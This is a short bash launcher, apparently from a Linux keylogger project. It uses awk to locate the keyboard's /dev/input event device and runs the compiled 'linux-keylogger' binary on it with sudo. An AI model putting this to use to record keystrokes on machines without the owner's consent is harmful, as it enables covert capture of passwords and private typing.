
#!/bin/bash

keyboard_event=$(awk '
  BEGIN { RS=""; FS="\n" }
  {
    has_kbd = 0;
    for (i = 1; i <= NF; i++) {
      if ($i ~ /Handlers=.*kbd.*event/) has_kbd = 1;
      if (has_kbd && $i ~ /Handlers/) {
        match($i, /event[0-9]+/, ev);
        print ev[0];
        exit;
      }
    }
  }
' /proc/bus/input/devices)

if [[ -z "$keyboard_event" ]]; then
    echo "No keyboard event found."
    exit 1
fi

echo "Using /dev/input/$keyboard_event"
sudo ./build/linux-keylogger "/dev/input/$keyboard_event"
